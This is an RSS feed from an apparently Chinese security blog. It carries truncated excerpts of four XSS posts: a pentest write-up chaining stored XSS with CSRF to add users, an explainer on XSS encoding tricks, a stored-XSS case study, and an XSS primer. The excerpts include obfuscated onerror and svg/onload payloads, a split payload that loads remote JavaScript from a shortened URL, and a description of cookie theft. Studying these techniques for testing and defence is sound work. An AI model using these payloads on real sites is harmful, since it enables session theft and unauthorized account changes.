<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Xss on </title>
    <link>http://wyb0.com/tags/xss/</link>
    <description>Recent content in Xss on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 14 Nov 2018 10:36:38 +0800</lastBuildDate>
    
	<atom:link href="http://wyb0.com/tags/xss/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>记一次渗透测试中利用存储型XSS添加用户</title>
      <link>http://wyb0.com/posts/recording-an-xss-in-pentest/</link>
      <pubDate>Wed, 14 Nov 2018 10:36:38 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/recording-an-xss-in-pentest/</guid>
      <description>0x00 简单查看 拿到目标后简单看了下，是一个类似员工管理的东西，用户可以创建group，其他用户可以搜索这个group然后申请加入
每个账号都可以注册组织，然后让别人加入，加入的用户有创建者、管理员、默认成员3个角色，管理员拥有的权限就比较大了，可以查看通讯录、添加成员、删除成员等等
0x01 申请加入组织流程分析 走了一遍流程，注册了两个账号，一个是reber，一个是yxk
在加入某组织时会让填验证信息，组织收到申请后同意然后把用户添加到某个分组然后确定
流程大概分4步，用户申请加入group、管理员点击同意、管理员关联用户到分组或成员、确定同意用户的申请
 用户reber搜索组织，然后提交验证消息  用户yxk在消息列表同意reber的申请  yxk给reber分组，点击下一步
 最后一步写入备注信息，点击同意按钮最终同意用户加入   0x02 请求链接分析 经过对上面流程的抓包分析测试，涉及到的有用请求有3个：管理员点击同意链接时的请求、关联到分组或成员的请求、确定同意的请求
 用户申请加入某group时发送的数据包如下：  API：/a/cms/org/applyorg POST：verification=11111&amp;amp;orgId=247173   group管理员同意用户申请时链接如下：  API：/a/cms/apply/handle-accept?id=6de027c0-9a4f-490e-a5e2-d1c76cd34a70&amp;amp;oid=247178&amp;amp;name=1760048****  这里链接里有一个id，经过抓包发现可以通过/a/cms/apply/applymsg这个接口直接得到同意申请时的链接
 将申请用户关联到分组或成员涉及到如下数据包：  API：/a/cms/apply/do.handle POST：ID=80b49e8f-4e8c-450f-8bf4-eb809271e779&amp;amp;OID=247178&amp;amp;GID=608863&amp;amp;MID=0&amp;amp;Agree=true&amp;amp;Reason=111  可以看到，上面的请求链接中都没有token，存在CSRF，就猜想能不能构造上述请求从而通过XSS和CSRF来做一些事情
0x03 构造直接添加用户到group的js 由于cookie设置了httponly，不能获取到完整的cookie，所以这里尝试写js代码，实现将用户直接加入group的功能
看了上面的请求包分析后发现，如果要构造数据包实现我们的想法的话需要有：ID、OID、GID这3个id
分析后发现在/a/cms/apply/applymsg请求的返回包中有同意的链接，链接中有ID
分析后发现在/a/cms/group/treeNode请求的返回包中有OID和GID
于是用于XSS的1.js内容构造如下：
//因为这里要把ajax的返回值return到函数中，需要是同步请求，所以async要设为false function get_agree_url(){//得到管理员同意用户申请的链接 var agree_url; var href; $.ajax({ type: &#39;get&#39;, url: &#39;/a/cms/apply/applymsg&#39;, async: false, success: function(data){ $(data).find(&#39;#accept&#39;).each(function(index,element){ href = $(this).attr(&#39;href&#39;); if (/id=.</description>
    </item>
    
    <item>
      <title>XSS中的编码</title>
      <link>http://wyb0.com/posts/xss-encode/</link>
      <pubDate>Thu, 30 Mar 2017 15:25:37 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/xss-encode/</guid>
      <description>0x00 浏览器解析 浏览器收到服务器发来的HTML内容，会从头解析，遇到&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;时， 会调用js脚本解析器来解析并执行脚本，然后继续解析其他的HTML内容， 对于需要触发才能执行的事件，当事件触发时脚本解析器才会解析其中的脚本， 在这之前它是HTML的一部分  0x01 一些编码  URL编码
%+字符的ASCII编码对应的两位十六进制，如&amp;quot;/&amp;quot;的url编码为&amp;quot;%2F&amp;quot;  HTML编码
 实体编码
&amp;amp;开头分号结尾，如 &amp;quot;&amp;lt;&amp;quot; 的编码是 &amp;quot;&amp;amp;lt;&amp;quot;  字符编码
样式为&amp;quot;&amp;amp;#数值;&amp;quot;，数值可为10进制、16进制ASCII编码或unicode字符编码 如&amp;quot;&amp;lt;&amp;quot;可编码为&amp;quot;&amp;amp;#060;&amp;quot;和&amp;quot;&amp;amp;#x3c;&amp;quot;，但是必须在属性值里面   JS编码
1、两个十六进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\x3c&amp;quot; 2、三个八进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\074&amp;quot; 3、四个十六进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\u003c&amp;quot; 4、对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）  CSS编码
反斜线(\)后跟1~6位的16进制数字，如&amp;quot;e&amp;quot;为&amp;quot;\65&amp;quot;或&amp;quot;65&amp;quot;或&amp;quot;00065&amp;quot;   0x02 编码与解码顺序 解码时先解码最外层，编码时先编码最内层
如&amp;lt;td onclick=&amp;quot;openUrl(add.do?userName=&#39;{$value}&#39;);&amp;quot;&amp;gt;11&amp;lt;/td&amp;gt;， 首先value出现在url中，而url在js中，而js又是html一部分，所以 解码顺序为：html解码-&amp;gt;js解码-&amp;gt;url解码 编码顺序为：url编码-&amp;gt;js编码-&amp;gt;html编码  0x03 利用  八进制
&amp;lt;p id=&amp;quot;test&amp;quot;&amp;gt;&amp;lt;/p&amp;gt; &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt; var test = &amp;quot;\74\151\155\147\40\163\162\143\75\170\40\157\156\145\162\162\157\162\75\141\154\145\162\164\50\61\51\76&amp;quot;; var p = document.getElementById(&#39;test&#39;); #这里会进行js解码 p.innerHTML = test; &amp;lt;/script&amp;gt;  十进制和十六进制
&amp;lt;img src=x onerror=&amp;quot;\u0061\u006c\u0065\u0072\u0074(1)&amp;quot;&amp;gt; &amp;lt;img src=x onerror=&amp;quot;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#49;&amp;amp;#41;&amp;quot;&amp;gt;  javascript协议</description>
    </item>
    
    <item>
      <title>一次存储型XSS利用实例</title>
      <link>http://wyb0.com/posts/recording-an-stored-xss/</link>
      <pubDate>Sun, 17 Jul 2016 23:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/recording-an-stored-xss/</guid>
      <description> 首先感谢凯神的指导
0x00 注册账号 先得到一个临时邮箱，然后注册账号 0x01 找输入输出点 0x02 尝试构造payload payload用如下的即可：
&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;a  但是这个要在点击删除时payload才起作用 也可用&amp;lt;img src=1 onerror=alert(1) /&amp;gt;自动加载，但也要点击删除按钮才能起作用 但是我们若想充分利用则需要远程加载自己的js  0x03 加载自己的js  此时的限制条件为：  * 30个字符 * script标签不能自己触发   只能构造类似下面的语句自己加载脚本：  a=document.createElement(&#39;script&#39;); a.src=&amp;quot;www.xxx.com&amp;quot;; document.head.appendChild(a);   可以用如下方法分割，多次添加：  a=document.createE/* */lement(&#39;script&#39;);/* */a.src=&amp;quot;www.xxx.com&amp;quot;;/* */document.head.app/* */endChild(a); 但此处不可行，考虑直接用JQuery等的函数getScript(URL)直接加载url，然而此处依然不行   查找  构造payload   使用如下payload： &amp;lt;svg/onload=&amp;quot;b=&#39;http://t.i&#39;&amp;quot;&amp;gt; &amp;lt;svg/onload=&amp;quot;b+=&#39;m/16ap6&#39;&amp;quot;&amp;gt; &amp;lt;svg/onload=&amp;quot;$loadJs(b)&amp;quot;&amp;gt;  0x04 得到Cookie </description>
    </item>
    
    <item>
      <title>XSS漏洞及其挖掘方法</title>
      <link>http://wyb0.com/posts/xss-basis-and-use/</link>
      <pubDate>Fri, 15 Jul 2016 10:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/xss-basis-and-use/</guid>
      <description>0x00 简介 XSS(跨站脚本攻击)是指攻击者在网页中嵌入客户端脚本，通常是Javascript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将在用户的浏览器上被解析执行。重点在&amp;rdquo;脚本&amp;rdquo;这两个字上，脚本主要有两个：JavaScript和ActionScript。
要想深入研究XSS，必须要精通JavaScript，JavaScript能做到什么效果，XSS的威力就有多强大。
0x01 危害 JavaScript可以用来获取用户Cookie、改变页面内容、URL转跳，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者仅仅需要向页面中注入JavaScript代码。
• 盗取管理员Cookie • XSS Worm • 挂马(水坑攻击) • 键盘记录(有局限性) • 利用网站重定向 • 修改网页内容 • 等等  0x02 攻击场景 在各类SNS、邮件系统、开源流行的Web应用、BBS、微博等社交场景中，前端攻击被广泛实施与关注。主要是一些大型网站才有价值。
• 支持html解析和javascript解析的客户端,如：html文档、flsh、pdf等 • url的参数，回显到网页上 • form表单提交的内容出现在网页上，如：昵称、邮箱、简介、留言 • 等等  0x03 分类 主要分为三类：反射型、存储型、DOM型(还有flash XSS、mXSS)。
 反射型XSS
  反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。
简单流程： 1. 用户访问带有XSS代码的URL请求 2. 服务器端接收数据后处理，然后返回带有XSS代码的数据发送给浏览器 3. 浏览器解析带有XSS代码的数据后，最终造成XSS漏洞 可能攻击流程： 1. 用户aaa在网站www.xxx.com浏览网页 2. 攻击者hacker发现www.xxx.com/xss.php存在反射型XSS漏洞，然后精心构造JavaScript代码， 3. 构造的代码的功能为盗取用户Cookie并发送到指定站点www.xxser.com 4. hacker将带有反射型XSS漏洞的URL通过站内信发给aaa，站内信为一些诱惑信息，目的是使用户aaa点击 5. 假设用户aaa点击了带有XSS漏洞的URL，则aaa的Cookie将被发送到www.xxser.com 6. hacker获取aaa的Cookie后可以以aaa的身份登陆www.xxx.com，从而得到aaa的敏感信息   存储型XSS
  存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。</description>
    </item>
    
  </channel>
</rss>